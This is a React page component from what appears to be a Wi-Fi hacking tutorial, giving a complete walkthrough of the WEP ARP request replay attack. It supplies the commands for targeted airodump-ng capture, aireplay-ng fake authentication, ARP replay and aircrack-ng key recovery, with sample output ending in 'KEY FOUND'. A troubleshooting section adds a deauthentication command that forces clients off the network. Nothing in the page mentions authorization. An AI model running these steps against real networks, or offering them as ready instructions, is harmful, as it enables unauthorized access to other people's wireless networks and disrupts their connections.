import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function ARPReplay() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WEP Cracking <span>/</span> ARP Replay Attack</div>
        <h1>ARP Request Replay Attack</h1>
        <p className="topic-desc">ARP replay captures an ARP request and retransmits it repeatedly, forcing the AP to generate new IVs rapidly. This is the fastest way to collect IVs for WEP cracking.</p>
      </div>

      <div className="topic-section">
        <h2>How ARP Replay Works</h2>
        <Diagram title="ARP Replay Attack Flow">
{`   ┌──────────────┐         ┌──────────────┐
   │  YOUR ADAPTER │         │  TARGET AP   │
   │  (wlan0mon)   │         │  (WEP)       │
   └──────┬───────┘         └──────┬───────┘
          │                         │
   1. Capture an ARP request        │
          │◀════════════════════════│  ← Client sends ARP
          │                         │
   2. Replay the captured ARP       │
          │════════════════════════▶│  → Send captured ARP
          │◀════════════════════════│  ← AP responds with NEW IV!
          │                         │
          │════════════════════════▶│  → Replay again
          │◀════════════════════════│  ← Another NEW IV!
          │                         │
          │════════════════════════▶│  → Replay again (x1000s)
          │◀════════════════════════│  ← 1000s of new IVs!
          │                         │
   
   Each replay generates a new packet with a NEW IV!
   IVs accumulate rapidly → crack the key quickly`}
        </Diagram>
      </div>

      <div className="topic-section">
        <h2>Full Attack Walkthrough</h2>
        <p>You need <strong>3 terminals</strong> running simultaneously:</p>

        <h3>Terminal 1: Targeted Capture</h3>
        <Terminal title="Terminal 1 — airodump-ng" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'flag', text: '--bssid ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '--channel ' }, { type: 'number', text: '6 ' }, { type: 'flag', text: '--write ' }, { type: 'string', text: 'wep_arp ' }, { type: 'string', text: 'wlan0mon' }],
        ]} />

        <h3>Terminal 2: Fake Authentication (if no clients)</h3>
        <Terminal title="Terminal 2 — Fake Auth" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--fakeauth ' }, { type: 'number', text: '30 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-h ' }, { type: 'highlight', text: '00:11:22:33:44:55 ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: 'Association successful :-) (AID: 1)' }],
        ]} />

        <h3>Terminal 3: ARP Replay</h3>
        <Terminal title="Terminal 3 — ARP Replay" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--arpreplay ' }, { type: 'flag', text: '-b ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-h ' }, { type: 'highlight', text: '00:11:22:33:44:55 ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: 'Saving ARP requests in replay_arp-0101-120000.cap' }],
          [{ type: 'output', text: 'You should also start airodump-ng to capture replies.' }],
          [{ type: 'output', text: 'Read 3854 packets (got 0 ARP requests), sent 0 packets...' }],
          [{ type: 'output', text: 'Read 5102 packets (got ' }, { type: 'highlight', text: '1' }, { type: 'output', text: ' ARP requests), sent 1200 packets...' }],
          [{ type: 'output', text: 'Read 12050 packets (got 1 ARP requests), sent ' }, { type: 'highlight', text: '8500' }, { type: 'output', text: ' packets...' }],
        ]} />

        <InfoBox type="note">
          <p>The attack waits for an ARP packet first ("got 0 ARP requests"). Once captured, it starts replaying rapidly. Watch the <code className="inline-code">#Data</code> column in airodump-ng — it will start climbing fast.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Command Breakdown</h2>
        <table className="info-table">
          <thead>
            <tr><th>Flag</th><th>Purpose</th></tr>
          </thead>
          <tbody>
            <tr><td><code>--arpreplay</code></td><td>ARP request replay attack mode</td></tr>
            <tr><td><code>-b AA:BB:CC:DD:EE:FF</code></td><td>BSSID of target AP</td></tr>
            <tr><td><code>-h 00:11:22:33:44:55</code></td><td>Your MAC (must be associated via fake auth)</td></tr>
          </tbody>
        </table>
      </div>

      <div className="topic-section">
        <h2>Step 4: Crack While Collecting</h2>
        <p>Open a 4th terminal to start cracking. aircrack-ng will keep retrying as more IVs come in:</p>
        <Terminal title="Terminal 4 — Crack" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aircrack-ng ' }, { type: 'string', text: 'wep_arp-01.cap' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '                          Aircrack-ng 1.7' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '  [00:00:05] Tested 12543 keys (got 25890 IVs)' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '          ' }, { type: 'highlight', text: 'KEY FOUND! [ AB:CD:EF:12:34 ]' }],
          [{ type: 'output', text: '   Decrypted correctly: 100%' }],
        ]} />
      </div>

      <Troubleshooting>
        <TroubleItem issue="'got 0 ARP requests' — stuck waiting for ARP">
          <div className="solution">Solution:</div>
          <p>No ARP traffic on the network. Options:</p>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Wait for a client to connect or do something on the network</li>
            <li>Deauth a client to force reconnection (which generates ARP)</li>
            <li>If there are no clients at all, use interactive packet injection</li>
          </ul>
          <Terminal title="Force ARP with Deauth" lines={[
            [{ type: 'comment', text: '# In another terminal, deauth a connected client' }],
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--deauth ' }, { type: 'number', text: '5 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-c ' }, { type: 'highlight', text: 'CLIENT_MAC ' }, { type: 'string', text: 'wlan0mon' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="Packets sent but #Data in airodump doesn't increase">
          <div className="solution">Solution:</div>
          <p>Fake auth may have dropped. Check that you're still associated in airodump. Re-run fake auth if needed. Also verify packet injection works: <code className="inline-code">aireplay-ng --test -a BSSID wlan0mon</code></p>
        </TroubleItem>
        <TroubleItem issue="aircrack-ng fails even with 20,000+ IVs">
          <div className="solution">Solution:</div>
          <p>Collect more IVs (try 50,000+). Some WEP keys need more data. Use the <code className="inline-code">-n</code> flag to specify key length if you know it (64 or 128).</p>
        </TroubleItem>
        <TroubleItem issue="'Interface wlan0mon doesn't support injection'">
          <div className="solution">Solution:</div>
          <p>Your adapter or driver doesn't support packet injection. You need an adapter with injection support (Alfa AWUS036NHA recommended).</p>
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
